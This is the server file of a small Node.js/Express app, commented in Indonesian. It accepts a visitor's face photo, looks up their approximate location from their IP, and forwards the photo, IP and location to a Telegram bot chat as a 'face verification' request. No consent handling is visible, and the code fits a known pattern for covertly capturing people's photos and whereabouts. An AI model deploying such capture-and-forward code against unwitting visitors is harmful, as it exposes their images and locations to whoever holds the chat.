require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

async function getLocationFromIp(ip) {
  try {
    const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city`);
    const data = await res.json();
    if (data.status === 'success') {
      return `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`;
    }
  } catch (e) {
    console.error('Gagal ambil lokasi IP:', e.message);
  }
  return 'Tidak diketahui';
}

app.post('/api/verify', async (req, res) => {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, error: 'BOT_TOKEN / CHAT_ID belum diset di environment variable' });
    }

    const { image } = req.body;
    if (!image) return res.status(400).json({ ok: false, error: 'Foto tidak ada' });

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const lokasi = await getLocationFromIp(ip);
    const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption',
      `🟡 Permintaan Verifikasi Wajah\n\n` +
      `📍 Lokasi (perkiraan dari IP): ${lokasi}\n` +
      `🕒 Waktu: ${waktu} WIB\n` +
      `🌐 IP: ${ip}\n\n` +
      `Cek fotonya, apakah ini sah?`
    );
    form.append('photo', buffer, { filename: 'verifikasi.jpg', contentType: 'image/jpeg' });

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    const tgData = await tgRes.json();

    if (!tgData.ok) {
      console.error('Telegram error:', tgData);
      return res.status(500).json({ ok: false, error: 'Gagal kirim ke Telegram' });
    }

    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: 'Terjadi kesalahan di server' });
  }
});

app.listen(PORT, () => console.log(`Server jalan di port ${PORT}`));
